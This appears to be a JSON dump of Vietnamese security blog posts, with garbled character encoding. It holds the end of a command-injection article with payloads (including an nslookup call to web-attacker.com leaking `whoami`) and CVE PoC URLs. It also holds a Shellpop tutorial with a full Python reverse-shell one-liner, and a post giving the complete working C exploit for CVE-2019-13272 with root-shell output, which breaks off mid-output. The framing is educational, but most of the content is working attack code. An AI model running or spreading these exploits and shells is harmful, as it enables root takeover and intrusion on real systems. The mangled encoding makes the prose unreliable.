N·∫øu th∆∞ m·ª•c g·ªëc c·ªßa website ·ªü /var/www/static th√¨ b·∫°n c√≥ th·ªÉ g·ª≠i l·ªánh ti√™m nh∆∞ sau\n1  \u0026amp;whoami \u0026gt; /var/www/static/whoami.txt \u0026amp;   R·ªìi sau ƒë√≥ b·∫°n c√≥ th·ªÉ s·ª≠ d·ª•ng tr√¨nh duy·ªát c·ªßa m√¨nh truy c·∫≠p v√†o http://target.com/whoami.txt ƒë·ªÉ truy xu·∫•t t·ªáp v√† xem ƒë·∫ßu ra t·ª´ l·ªánh ƒë∆∞·ª£c ch√®n v√†o.\nNgo√†i ra, c√≤n c√≥ th·ªÉ s·ª≠ d·ª•ng 1 s·ªë th·ªß thu·∫≠t kh√°c ƒë·ªÉ ki·ªÉm tra xem l·ªánh ti√™m ƒë√£ ƒÉn hay ch∆∞a. V√≠ d·ª•:\n1  \u0026amp; nslookup web-attacker.com \u0026amp;   Attacker s·∫Ω ki·ªÉm tra server c·ªßa m√¨nh v√† ph√°t hi·ªán ra r·∫±ng l·ªánh ƒë√£ ƒë∆∞·ª£c ti√™m th√†nh c√¥ng hay ch∆∞a. Ngo√†i ra c√≤n c√≥ th·ªÉ s·ª≠ d·ª•ng\n1  \u0026amp; nslookup `whoami`.web-attacker.com \u0026amp;   C√°c c√°ch d√πng ƒë·ªÉ Command Injection ƒê·∫ßu ti√™n c·∫ßn ph·∫£i x√°c ƒë·ªãnh ƒë∆∞·ª£c h·ªá th·ªëng target ƒëang ho·∫°t ƒë·ªông l√† g√¨, Windows hay Linux? M·ªôt s·ªë k√Ω t·ª± c√≥ ch·ª©c nƒÉng ph√¢n t√°ch l·ªánh, cho ph√©p c√°c l·ªánh n·ªëi v·ªõi nhau\n \u0026amp; \u0026amp;\u0026amp; | ||  V√≠ d·ª• M·ªôt s·ªë l·ªói Command Injection th·ª±c t·∫ø ƒë√£ g·∫∑p ph·∫£i WordPress DZS-VideoGallery Plugin (CVE: 2014-9094) Phi√™n b·∫£n DZS-VideoGallery 7.85 Plugin c·ªßa WordPress c√≥ l·ªó h·ªïng c√≥ th·ªÉ truy·ªÅn command injection v√†o ƒë√¢y,\nPoC:\n1  http://www.example.com/wp-content/plugins/dzs-videogallery/img.php?webshot=1\u0026amp;amp;src=http://www.example.com/1.jpg$(os-cmd)   Gemitel 3.50 - \u0026lsquo;/affich.php\u0026rsquo; Remote File Inclusion / Command Injection (CVE: 2004-1934) File : html/affich.php\nCode:\n 1 2 3 4  $f_inc=$base.\u0026#34;sp-turn.php\u0026#34;; $plus = \u0026#34;../\u0026#34;; // rajoute au chemin pour trouver les fichiers .txt require(\u0026#34;$f_inc\u0026#34;); //require(\u0026#34;sp-turn.php\u0026#34;);    ƒê·ªçc source code ta c≈©ng th·∫•y ƒë∆∞·ª£c r·∫±ng ƒëo·∫°n require(\u0026quot;$f_inc\u0026quot;); s·∫Ω th·ª±c thi command line. M√† $f_inc=$base.\u0026quot;sp-turn.php\u0026quot;;. ·ªû ƒëo·∫°n n√†y ta c√≥ th·ªÉ truy·ªÅn sp-turn.php b·∫±ng $base t√πy theo √Ω m√¨nh mu·ªën\nPoC:\n1  http://www.example.com/[Gemitel folder]/html/affich.php?base=http://[your server]/   Pandora Fms 3.1 - OS Command Injection (CVE: 2010-4278) 1 ƒëo·∫°n code ng·∫Øn c·ªßa file operation/agentes/networkmap.php\n1 2 3 4 5 6 7 8 9  32 $layout = (string) get_parameter (\u0026#39;layout\u0026#39;, \u0026#39;radial\u0026#39;); ... 137 $filename_map = $config[\u0026#34;attachment_store\u0026#34;].\u0026#34;/networkmap_\u0026#34;.$layout; 138 $filename_img = \u0026#34;attachment/networkmap_\u0026#34;.$layout.\u0026#34;_\u0026#34;.$font_size; 139 $filename_dot = $config[\u0026#34;attachment_store\u0026#34;].\u0026#34;/networkmap_\u0026#34;.$layout; ... 162 $cmd = \u0026#34;$filter-Tcmapx -o\u0026#34;.$filename_map.\u0026#34; -Tpng - -o\u0026#34;.$filename_img.\u0026#34; \u0026#34;.$filename_dot; 163 $result = system ($cmd);   Ta c√≥ th·ªÉ th·∫•y c√≥ th·ªÉ command injection v√†o ƒë√¢y\nPoC:\n1  http://servername/pandora_console/index.php?login=1\u0026amp;login=1\u0026amp;sec=estado\u0026amp;sec2=operation/agentes/networkmap\u0026amp;refr=0\u0026amp;layout=1;uname%20-a;   1  http://servername/pandora_console/index.php?login=1\u0026amp;sec=estado\u0026amp;sec2=operation/agentes/networkmap\u0026amp;refr=0\u0026amp;layout=1;id;   L√†m sao ƒë·ªÉ ngƒÉn ng·ª´a Command Injection C√°ch hi·ªáu qu·∫£ nh·∫•t ƒë·ªÉ ngƒÉn ng·ª´a command injection l√† kh√¥ng d√πng command n·ªØa. T·ª©c l√† kh√¥ng bao gi·ªù g·ªçi ra c√°c l·ªánh OS t·ª´ l·ªõp ·ª©ng d·ª•ng. Trong c√°c tr∆∞·ªùng h·ª£p, c√≥ nhi·ªÅu c√°ch kh√°c nhau ƒë·ªÉ th·ª±c hi·ªán ch·ª©c nƒÉng c·∫ßn thi·∫øt b·∫±ng c√°ch s·ª≠ d·ª•ng API tr√™n n·ªÅn t·∫£ng an to√†n h∆°n. N·∫øu kh√¥ng th·ªÉ tr√°nh kh·ªèi vi·ªác s·ª≠ d·ª•ng c√°c l·ªánh OS th√¨ ph·∫£i th·ª±c hi·ªán x√°c th·ª±c ƒë·∫ßu v√†o m·∫°nh\n Ch·ªâ ch·∫•p nh·∫≠n ƒë·ªëi v·ªõi c√°c gi√° tr·ªã ƒë∆∞·ª£c ph√©p Ch·ªâ ch·∫•p nh·∫≠n ƒë·∫ßu v√†o l√† m·ªôt s·ªë Ch·ªâ ch·∫•p nh·∫≠n ƒë·∫ßu v√†o ch·ªâ c√≥ k√Ω t·ª± ch·ªØ v√† s·ªë, kh√¥ng c√≥ k√Ω t·ª± ƒë·∫∑c bi·ªát, kho·∫£ng tr·∫Øng,\u0026hellip;  T√†i li·ªáu tham kh·∫£o  https://support.portswigger.net/customer/portal/articles/2590661-using-burp-to-test-for-os-command-injection-vulnerabilities https://portswigger.net/web-security/os-command-injection https://www.owasp.org/index.php/Command_Injection  ","permalink":"https://minhtuanact.ml/posts/os-command-injection-la-gi-command-injection-co-nguy-hiem-khong-can-cuc-ky-than-trong-doi-voi-cac-lenh-os-goi-tu-website-cua-ban/","summary":"OS Command Injection l√† g√¨? OS Command Injection (hay c√≤n ƒë∆∞·ª£c g·ªçi l√† shell injection) l√† m·ªôt l·ªó h·ªïng b·∫£o m·∫≠t web cho ph√©p k·∫ª t·∫•n c√¥ng th·ª±c thi c√°c l·ªánh h·ªá ƒëi·ªÅu h√†nh (OS) t√πy √Ω tr√™n m√°y ch·ªß ƒëang ch·∫°y service n√†o ƒë√≥. K·∫ª t·∫•n c√¥ng c√≥ th·ªÉ t·∫≠n d·ª•ng l·ªó h·ªïng n√†y ƒë·ªÉ khai th√°c, l·∫•y th√¥ng tin, chuy·ªÉn cu·ªôc t·∫•n c√¥ng sang h·ªá th·ªëng kh√°c b√™n trong t·ªï ch·ª©c Th·ª±c hi·ªán c√°c l·ªánh t√πy √Ω V√≠ d·ª•: https://insecure-website.","title":"OS Command Injection l√† g√¨, Command Injection c√≥ nguy hi·ªÉm kh√¥ng?, c·∫ßn c·ª±c k·ª≥ th·∫≠n tr·ªçng ƒë·ªëi v·ªõi c√°c l·ªánh OS g·ªçi t·ª´ Website c·ªßa b·∫°n"},{"content":"B·∫°n ƒë√£ ch√°n c·∫£nh l∆∞u l·∫°i c√°c l·ªánh shell tr√™n m√°y t√≠nh c·ªßa m√¨nh, v√† b·∫°n ƒë√£ m·ªát m·ªèi khi ƒëi t√¨m ch√∫ng ·ªü ƒë√¢u m·ªói khi m√¨nh c·∫ßn. ƒê·ªÉ gi·∫£i quy·∫øt vi·ªác n√†y, Shellpop ƒë∆∞·ª£c sinh ra v·ªõi v√¥ v√†n c√°c ti·ªán √≠ch m√† n√≥ ƒëem l·∫°i, gi·ªù ƒë√¢y b·∫°n s·∫Ω kh√¥ng c·∫ßn ph·∫£i l∆∞u l·∫°i v√† ƒëi t√¨m c√°c l·ªánh shell m·ªói khi c·∫ßn n·ªØa.\nAbout C√¥ng c·ª• n√†y ƒë∆∞·ª£c ph√°t tri·ªÉn b·ªüi Andre Marques v√† ƒë√¢y l√† m·ªôt m√£ ngu·ªìn m·ªü n√™n ai c√≥ b·∫•t k·ª≥ √Ω t∆∞·ªüng n√†o hay ho th√¨ tham gia v√†o c√πng ph√°t tri·ªÉn nh√©\nGithub: https://github.com/0x00-0x00/ShellPop\nC√†i ƒë·∫∑t Ch∆∞∆°ng tr√¨nh b·∫Øt bu·ªôc c√†i Python 2.7\nƒê·∫ßu ti√™n ch√∫ng ta c·∫ßn ph·∫£i clone git v·ªÅ\n1  git clone https://github.com/0x00-0x00/ShellPop.git   Ti·∫øp theo g√µ l·ªánh cd Shellpop/\nTh·ª±c hi·ªán c√†i ƒë·∫∑t c√°c d·ªãch v·ª• b·∫Øt bu·ªôc\n1 2  root@kali# apt-get install python-argcomplete metasploit-framework -y root@kali# pip install -r requirements.txt   B·∫Øt ƒë·∫ßu c√†i ƒë·∫∑t\n1  root@kali# python setup.py install   V·∫≠y l√† ta ƒë√£ c√†i ƒë·∫∑t xong, b·∫Øt ƒë·∫ßu v√†o s·ª≠ d·ª•ng th√¥i.\nS·ª≠ d·ª•ng 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48  root@kali:~/Documents/ShellPop# shellpop --help usage: shellpop [-h] [-l] [-H HOST] [-P PORT] [--number NUMBER] [--shell SHELL] [--reverse] [--bind] [--payload PAYLOAD] [--xor] [--base64] [--urlencode] [--ipfuscate] [--obfuscate-small] [--handler] [--stager STAGER] [--http-port HTTP_PORT] [--powershell-x86] [--powershell-x64] [--powershell-random-case] [--clip] Options: -h, --help show this help message and exit -l, --list List of available shells -H HOST, --host HOST IP to be used in connectback (reverse) shells. -P PORT, --port PORT Port to be used in reverse/bind shell code. --number NUMBER Shell code index number --shell SHELL Terminal shell to be used when decoding some encoding scheme. --handler Use handler, if possible. Shell Types: --reverse Victim communicates back to the attacking machine. --bind Open up a listener on the victim machine. --payload PAYLOAD Choose the payload Encoders Options: --xor Enable XOR obfuscation --base64 Encode command in base64. --urlencode Encode the command in URL encoding. Obfuscation Options: --ipfuscate Obfuscate IP address. --obfuscate-small Obfuscated command will be as small as possible. Staging Options: --stager STAGER Use staging for shells --http-port HTTP_PORT HTTP staging port to be used PowerShell options: --powershell-x86 Use powershell 32-bit executable. --powershell-x64 Use powershell 64-bit executable. --powershell-random-case Use random-case in powershell payloads. Miscellaneous: --clip Copy payload to your clipboard automatically. Pop shells like a master. For more help visit:https://github.com/0x00-0x00/ShellPop   Danh s√°ch shell Shellpop cung c·∫•p cho ta kh√° nhi·ªÅu ti·ªán √≠ch, b·∫°n c√≥ th·ªÉ li·ªát k√™ t·∫•t c·∫£ c√°c shell c·ªßa shellpop b·∫±ng c√°ch s·ª≠ d·ª•ng t√πy ch·ªçn l·ªánh \u0026ndash;list V√≠ d·ª•:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54  root@kali:~/Documents/ShellPop# shellpop --list shellpop v0.36 Contributors: @zc00l,@touhidshaikh,@lowfuel [+] Bind shells: 1. Python TCP +pty 2. Python UDP 3. Perl TCP 4. Perl UDP 5. PHP TCP 6. PHP UDP 7. Ruby TCP 8. Ruby UDP 9. Netcat (OpenBSD) TCP 10. Netcat+coproc (OpenBSD) UDP 11. Netcat (Traditional) TCP 12. AWK TCP 13. socat UDP 14. Windows Powershell TCP 15. Windows Powershell Nishang TCP [+] Reverse shells: 1. Python TCP +pty 2. Python UDP 3. PHP TCP 4. Ruby TCP 5. Perl TCP 01 6. Perl TCP 02 7. Perl UDP [nc -lkvup PORT] 8. Bash TCP 9. Windows Powershell TCP 10. TCLsh TCP 11. Ncat TCP 12. Ncat SSL TCP 13. Netcat (Traditional) UDP 14. Netcat (Traditional) TCP 15. Netcat (OpenBSD) mkfifo TCP 16. Netcat (OpenBSD) mknod TCP 17. Telnet mkfifo TCP 18. Telnet mknod TCP 19. openssl TCP 20. socat TCP 21. awk TCP 22. awk UDP 23. Windows Bat2Ncat TCP 24. Windows Powershell Shellcode-Injection a.k.a BloodSeeker TCP - x64 25. Windows Powershell Tiny TCP 26. Windows Powershell Nishang TCP 27. Windows Powershell Nishang ICMP 28. Windows Bat2Meterpreter TCP 29. Groovy TCP   ·ªû ƒë√¢y ch√∫ng ta th·∫•y ƒë∆∞·ª£c l√† shellpop h·ªó tr·ª£ ƒë·ªß lo·∫°i ng√¥n ng·ªØ t·ª´ Python, PHP, Ruby, Perl cho ƒë·∫øn Windows Powershell, \u0026hellip; Shellpop c√≤n h·ªó tr·ª£ c·∫£ TCP, UDP, ICMP, \u0026hellip;\nSao ch√©p v√†o clipboard Shellpop s·∫Ω kh√¥ng cho b·∫°n l√£ng ph√≠ m·ªôt gi√¢y ph√∫t n√†o c·∫£ (v√¨ m·ª•c ƒë√≠ch c·ªßa ch∆∞∆°ng tr√¨nh n√†y ƒë∆∞·ª£c t·∫°o ra l√† gi√∫p ng∆∞·ªùi d√πng kh√¥ng l√£ng ph√≠ th·ªùi gian m√†). V·ªõi t√πy ch·ªçn --clip, ngay l·∫≠p t·ª©c shell m√† b·∫°n v·ª´a t·∫°o ra s·∫Ω ƒë∆∞·ª£c sao ch√©p v√†o clipboard c·ªßa b·∫°n r·ªìi. Vi·ªác c·ªßa b·∫°n ch·ªâ vi·ªác paste ra m√† th√¥i.\nBind shells v√† Reverse shells Ch√∫ng ta t·∫≠p trung v√†o 2 v·∫•n ƒë·ªÅ ch√≠nh l√† Bind shells v√† Reverse shells\nCh√∫ng ta th·ª≠ t·∫°o 1 reverse shells xem sao nh√©\n·ªû ƒë√¢y m√¨nh t·∫°o 1 Reverse Shell ·ªü IP tr√™n eth0 v√† c·ªïng 4444 Command line examples\n1 2 3 4 5 6  root@kali:~# shellpop --host eth0 --port 4444 --reverse --number 1 [+] Execute this code in remote target: python -c \u0026#34;import os;import pty;import socket;jbNZvh=\u0026#39;192.168.19.100\u0026#39;;GCVfMeJlExfIfs=4444;ugQNFu=socket.socket(socket.AF_INET,socket.SOCK_STREAM);ugQNFu.connect((jbNZvh,GCVfMeJlExfIfs));os.dup2(ugQNFu.fileno(),0);os.dup2(ugQNFu.fileno(),1);os.dup2(ugQNFu.fileno(),2);os.putenv(\u0026#39;HISTFILE\u0026#39;,\u0026#39;/dev/null\u0026#39;);pty.spawn(\u0026#39;/bin/bash\u0026#39;);ugQNFu.close();\u0026#34; [+] This shell DOES NOT have a handler set.    shellpop: g·ªçi ch∆∞∆°ng tr√¨nh shellpop --host: X√°c ƒë·ªãnh ƒë·ªãa ch·ªâ ƒë√≠ch --port: X√°c ƒë·ªãnh c·ªïng --reverse: Ch·ªçn t√πy ch·ªçn reverse --number: X√°c ƒë·ªãnh ki·ªÉu m√† m√¨nh mu·ªën t·∫°o shell, v·ªõi s·ªë th·ª© t·ª± ·ªü t√πy ch·ªçn --list b√™n tr√™n.  T·ª± ƒë·ªông ho√†n th√†nh V·ªõi ch·ª©c nƒÉng n√†y, b·∫°n c√≥ th·ªÉ qu√™n lu√¥n c√°i --list, --number kia ƒëi, d∆∞·ªõi ƒë√¢y l√† v√≠ d·ª• cho c√°c b·∫°n hi·ªÉu. Ch·ªâ c·∫ßn b√°m v√†o ƒë·ªëi s·ªë c·ªßa --payload l√† b·∫°n c√≥ th·ªÉ t·ª± t·∫°o cho m√¨nh 1 shell mong mu·ªën r·ªìi.\nM√£ h√≥a Hi·ªán t·∫°i ch∆∞∆°ng tr√¨nh cung c·∫•p 3 lo·∫°i m√£ h√≥a l√† XOR, Base64 v√† URL. Ch√∫ng ta c√≥ th·ªÉ s·ª≠ d·ª•ng t·ª´ng lo·∫°i m√£ h√≥a ho·∫∑c c√≥ th·ªÉ \u0026ldquo;mix\u0026rdquo; nhi·ªÅu lo·∫°i v·ªõi nhau.\nV√≠ d·ª•: Handlers T√πy ch·ªçn n√†y gi√∫p b·∫°n gi·∫£m thi·ªÉu t·ªëi ƒëa vi·ªác t·∫°o v√† connect shell. V√≠ d·ª•: T·ªïng k·∫øt Shellpop l√† m·ªôt c√¥ng c·ª• tuy·ªát v·ªùi cho nh·ªØng b√†i pentest. C√≤n r·∫•t nhi·ªÅu ti·ªán √≠ch hay m√† c√¥ng c·ª• ƒëem l·∫°i, b·∫°n ƒë·ªçc t√¨m hi·ªÉu d·∫ßn d·∫ßn nh√©. N·∫øu th·∫•y b√†i vi·∫øt h·ªØu √≠ch th√¨ ƒë·ªÉ l·∫°i 1 share 1 upvote ƒë·ªÉ m√¨nh c√≥ ƒë·ªông l·ª±c ra c√°c b√†i vi·∫øt hay h∆°n nh√©.\n","permalink":"https://minhtuanact.ml/posts/tao-vo-van-lenh-shell-chiem-quyen-truy-cap-bang-cong-cu-shellpop-tren-linux/","summary":"B·∫°n ƒë√£ ch√°n c·∫£nh l∆∞u l·∫°i c√°c l·ªánh shell tr√™n m√°y t√≠nh c·ªßa m√¨nh, v√† b·∫°n ƒë√£ m·ªát m·ªèi khi ƒëi t√¨m ch√∫ng ·ªü ƒë√¢u m·ªói khi m√¨nh c·∫ßn. ƒê·ªÉ gi·∫£i quy·∫øt vi·ªác n√†y, Shellpop ƒë∆∞·ª£c sinh ra v·ªõi v√¥ v√†n c√°c ti·ªán √≠ch m√† n√≥ ƒëem l·∫°i, gi·ªù ƒë√¢y b·∫°n s·∫Ω kh√¥ng c·∫ßn ph·∫£i l∆∞u l·∫°i v√† ƒëi t√¨m c√°c l·ªánh shell m·ªói khi c·∫ßn n·ªØa.\nAbout C√¥ng c·ª• n√†y ƒë∆∞·ª£c ph√°t tri·ªÉn b·ªüi Andre Marques v√† ƒë√¢y l√† m·ªôt m√£ ngu·ªìn m·ªü n√™n ai c√≥ b·∫•t k·ª≥ √Ω t∆∞·ªüng n√†o hay ho th√¨ tham gia v√†o c√πng ph√°t tri·ªÉn nh√©","title":"T·∫°o v√¥ v√†n l·ªánh shell chi·∫øm quy·ªÅn truy c·∫≠p b·∫±ng c√¥ng c·ª• Shellpop tr√™n Linux"},{"content":"M·ªü ƒë·∫ßu  Ng√†y h√¥m qua, 1 th√†nh vi√™n trong ƒë·ªôi c·ªßa t√¥i ƒë√£ g·ª≠i cho t√¥i 1 b√†i post tr√™n facebook n√≥i v·ªÅ con CVE-2019-13272 n√†y. Sau m·ªôt h·ªìi t√¨m hi·ªÉu th√¨ con CVE n√†y c·ª±c k√¨ nghi√™m tr·ªçng. N√≥ c√≥ th·ªÉ chi·∫øm quy·ªÅn root m√°y c·ªßa b·∫°n ch·ªâ sau ƒë√∫ng m·ªôt n·ªët nh·∫°c. B√†i vi·∫øt n√†y ch·ªâ mang t√≠nh gi·ªõi thi·ªáu, b·∫°n n√†o mu·ªën t√¨m hi·ªÉu v·ªÅ c√°ch th·ª©c ho·∫°t ƒë·ªông c·ªßa con CVE-2019-13272 th√¨ b·∫°n c√≥ th·ªÉ t√¨m hi·ªÉu tr√™n m·∫°ng nh√© ^^.  CVE-2019-13272  Tr·∫°ng th√°i: M·ªõi T√™n: CVE-2019-13272 Th√†nh ph·∫ßn: D·ªÖ b·ªã t·ªïn th∆∞∆°ng Ph·∫ßn c·ª©ng: T·∫•t c·∫£ H·ªá ƒëi·ªÅu h√†nh: Linux ∆Øu ti√™n: Cao M·ª©c ƒë·ªô nghi√™m tr·ªçng: Cao T√°c gi·∫£: Laura Pardo B√°o c√°o: 2019-07-17 20:06 UTC ƒê√£ ƒë∆∞·ª£c s·ª≠a trong phi√™n b·∫£n: Kernel 5.1.17   Tr√≠ch nguy√™n vƒÉn c·ªßa Laura Pardo\n1  Laura Pardo 2019-07-17 20:06:24 UTC    A flaw in the kernels implementation of ptrace which could inadvertantly grant elevated permissions to an attacker who could abuse the relationship between tracer and the process being traced.\nThe mechanism used to link the process requesting the ptrace and the process being ptraced could allow a local user to obtain root level priviledges by creating an opportunity to abuse the frequently used pattern of dropping privileges and then execve a child with reduced privileges/permissions.\n PoC 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 194 195 196 197 198 199 200 201 202 203 204 205 206 207 208 209  #define _GNU_SOURCE #include \u0026lt;string.h\u0026gt;#include \u0026lt;stdlib.h\u0026gt;#include \u0026lt;unistd.h\u0026gt;#include \u0026lt;err.h\u0026gt;#include \u0026lt;signal.h\u0026gt;#include \u0026lt;stdio.h\u0026gt;#include \u0026lt;fcntl.h\u0026gt;#include \u0026lt;sched.h\u0026gt;#include \u0026lt;stddef.h\u0026gt;#include \u0026lt;stdarg.h\u0026gt;#include \u0026lt;pwd.h\u0026gt;#include \u0026lt;sys/prctl.h\u0026gt;#include \u0026lt;sys/wait.h\u0026gt;#include \u0026lt;sys/ptrace.h\u0026gt;#include \u0026lt;sys/user.h\u0026gt;#include \u0026lt;sys/syscall.h\u0026gt;#include \u0026lt;sys/stat.h\u0026gt;#include \u0026lt;linux/elf.h\u0026gt; #define SAFE(expr) ({ \\ typeof(expr) __res = (expr); \\ if (__res == -1) err(1, \u0026#34;%s\u0026#34;, #expr); \\ __res; \\ }) #define max(a,b) ((a)\u0026gt;(b) ? (a) : (b))  static int middle_success = 1; static int block_pipe[2]; static int self_fd = -1; static int dummy_status; static const char *helper_path; const char *helpers[] = { \u0026#34;/usr/lib/x86_64-linux-gnu/xfce4/session/xfsm-shutdown-helper\u0026#34;, }; /* temporary printf; returned pointer is valid until next tprintf */ static char *tprintf(char *fmt, ...) { static char buf[10000]; va_list ap; va_start(ap, fmt); vsprintf(buf, fmt, ap); va_end(ap); return buf; } static int middle_main(void *dummy) { prctl(PR_SET_PDEATHSIG, SIGKILL); pid_t middle = getpid(); self_fd = SAFE(open(\u0026#34;/proc/self/exe\u0026#34;, O_RDONLY)); pid_t child = SAFE(fork()); if (child == 0) { prctl(PR_SET_PDEATHSIG, SIGKILL); SAFE(dup2(self_fd, 42)); /* spin until our parent becomes privileged (have to be fast here) */ int proc_fd = SAFE(open(tprintf(\u0026#34;/proc/%d/status\u0026#34;, middle), O_RDONLY)); char *needle = tprintf(\u0026#34;\\nUid:\\t%d\\t0\\t\u0026#34;, getuid()); while (1) { char buf[1000]; ssize_t buflen = SAFE(pread(proc_fd, buf, sizeof(buf)-1, 0)); buf[buflen] = \u0026#39;\\0\u0026#39;; if (strstr(buf, needle)) break; } /* * this is where the bug is triggered. * while our parent is in the middle of pkexec, we force it to become our * tracer, with pkexec\u0026#39;s creds as ptracer_cred. */ SAFE(ptrace(PTRACE_TRACEME, 0, NULL, NULL)); /* * now we execute passwd. because the ptrace relationship is considered to * be privileged, this is a proper suid execution despite the attached * tracer, not a degraded one. * at the end of execve(), this process receives a SIGTRAP from ptrace. */ puts(\u0026#34;executing passwd\u0026#34;); execl(\u0026#34;/usr/bin/passwd\u0026#34;, \u0026#34;passwd\u0026#34;, NULL); err(1, \u0026#34;execl passwd\u0026#34;); } SAFE(dup2(self_fd, 0)); SAFE(dup2(block_pipe[1], 1)); struct passwd *pw = getpwuid(getuid()); if (pw == NULL) err(1, \u0026#34;getpwuid\u0026#34;); middle_success = 1; execl(\u0026#34;/usr/bin/pkexec\u0026#34;, \u0026#34;pkexec\u0026#34;, \u0026#34;--user\u0026#34;, pw-\u0026gt;pw_name, helper_path, \u0026#34;--help\u0026#34;, NULL); middle_success = 0; err(1, \u0026#34;execl pkexec\u0026#34;); } static void force_exec_and_wait(pid_t pid, int exec_fd, char *arg0) { struct user_regs_struct regs; struct iovec iov = { .iov_base = \u0026amp;regs, .iov_len = sizeof(regs) }; SAFE(ptrace(PTRACE_SYSCALL, pid, 0, NULL)); SAFE(waitpid(pid, \u0026amp;dummy_status, 0)); SAFE(ptrace(PTRACE_GETREGSET, pid, NT_PRSTATUS, \u0026amp;iov)); /* set up indirect arguments */ unsigned long scratch_area = (regs.rsp - 0x1000) \u0026amp; ~0xfffUL; struct injected_page { unsigned long argv[2]; unsigned long envv[1]; char arg0[8]; char path[1]; } ipage = { .argv = { scratch_area + offsetof(struct injected_page, arg0) } }; strcpy(ipage.arg0, arg0); for (int i = 0; i \u0026lt; sizeof(ipage)/sizeof(long); i++) { unsigned long pdata = ((unsigned long *)\u0026amp;ipage)[i]; SAFE(ptrace(PTRACE_POKETEXT, pid, scratch_area + i * sizeof(long), (void*)pdata)); } /* execveat(exec_fd, path, argv, envv, flags) */ regs.orig_rax = __NR_execveat; regs.rdi = exec_fd; regs.rsi = scratch_area + offsetof(struct injected_page, path); regs.rdx = scratch_area + offsetof(struct injected_page, argv); regs.r10 = scratch_area + offsetof(struct injected_page, envv); regs.r8 = AT_EMPTY_PATH; SAFE(ptrace(PTRACE_SETREGSET, pid, NT_PRSTATUS, \u0026amp;iov)); SAFE(ptrace(PTRACE_DETACH, pid, 0, NULL)); SAFE(waitpid(pid, \u0026amp;dummy_status, 0)); } static int middle_stage2(void) { /* our child is hanging in signal delivery from execve()\u0026#39;s SIGTRAP */ pid_t child = SAFE(waitpid(-1, \u0026amp;dummy_status, 0)); force_exec_and_wait(child, 42, \u0026#34;stage3\u0026#34;); return 0; } static int spawn_shell(void) { SAFE(setresgid(0, 0, 0)); SAFE(setresuid(0, 0, 0)); execlp(\u0026#34;bash\u0026#34;, \u0026#34;bash\u0026#34;, NULL); err(1, \u0026#34;execlp\u0026#34;); } int main(int argc, char **argv) { if (strcmp(argv[0], \u0026#34;stage2\u0026#34;) == 0) return middle_stage2(); if (strcmp(argv[0], \u0026#34;stage3\u0026#34;) == 0) return spawn_shell(); for (int i=0; i\u0026lt;sizeof(helpers)/sizeof(helpers[0]); i++) { struct stat st; if (stat(helpers[i], \u0026amp;st) == 0) { helper_path = helpers[i]; break; } } if (helper_path == NULL) errx(1, \u0026#34;no known helper found, add a helper with \u0026lt;allow_active\u0026gt;yes\u0026lt;/allow_active\u0026gt; from /usr/share/polkit-1/actions to `helpers`\u0026#34;); /* * set up a pipe such that the next write to it will block: packet mode, * limited to one packet */ SAFE(pipe2(block_pipe, O_CLOEXEC|O_DIRECT)); SAFE(fcntl(block_pipe[0], F_SETPIPE_SZ, 0x1000)); char dummy = 0; SAFE(write(block_pipe[1], \u0026amp;dummy, 1)); /* spawn pkexec in a child, and continue here once our child is in execve() */ static char middle_stack[1024*1024]; pid_t midpid = SAFE(clone(middle_main, middle_stack+sizeof(middle_stack), CLONE_VM|CLONE_VFORK|SIGCHLD, NULL)); if (!middle_success) return 1; /* * wait for our child to go through both execve() calls (first pkexec, then * the executable permitted by polkit policy). */ while (1) { int fd = open(tprintf(\u0026#34;/proc/%d/comm\u0026#34;, midpid), O_RDONLY); char buf[16]; int buflen = SAFE(read(fd, buf, sizeof(buf)-1)); buf[buflen] = \u0026#39;\\0\u0026#39;; *strchrnul(buf, \u0026#39;\\n\u0026#39;) = \u0026#39;\\0\u0026#39;; if (strncmp(buf, basename(helper_path), 15) == 0) break; usleep(100000); } /* * our child should have gone through both the privileged execve() and the * following execve() here */ SAFE(ptrace(PTRACE_ATTACH, midpid, 0, NULL)); SAFE(waitpid(midpid, \u0026amp;dummy_status, 0)); fputs(\u0026#34;attached to midpid\\n\u0026#34;, stderr); force_exec_and_wait(midpid, 0, \u0026#34;stage2\u0026#34;); return 0; }   K·∫øt qu·∫£ Debian Debian 10 (xfce) 1  /usr/lib/gnome-settings-daemon/gsd-backlight-helper   1 2 3 4 5 6  user@debian-10-0-0-x64:~/Desktop/47133$ ./a.out executing passwd attached to midpid root@debian-10-0-0-x64:/home/user/Desktop/47133# id uid=0(root) gid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),112(bluetooth),116(lpadmin),117(scanner),1000(user) root@debian-10-0-0-x64:/home/user/Desktop/47133#   Debian 9.4 (xfce) 1  /usr/lib/x86_64-linux-gnu/xfce4/session/xfsm-shutdown-helper   1 2 3 4 5  user@debian9-4-0-x64:~/Desktop/47133$ ./a.out executing passwd attached to midpid root@debian9-4-0-x64:/home/user/Desktop/47133# id uid=0(root) gid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),113(lpadmin),117(scanner),1000(user)   Devuan 2.0.0 (xfce) 1  /usr/lib/x86_64-linux-gnu/xfce4/session/xfsm-shutdown-helper   1 2 3 4  user@devuan-2-0-0:~/Desktop/47133$ ./a.out executing passwd attached to midpid root@devuan-2-0-0:/home/user/Desktop/47133#   SparkyLinux 5 (lxqt) 1  /usr/bin/lxqt-backlight_backend   1 2 3 4 5 6  user@sparkylinux-5-x64:~/47133$ ./a.out executing passwd attached to midpid 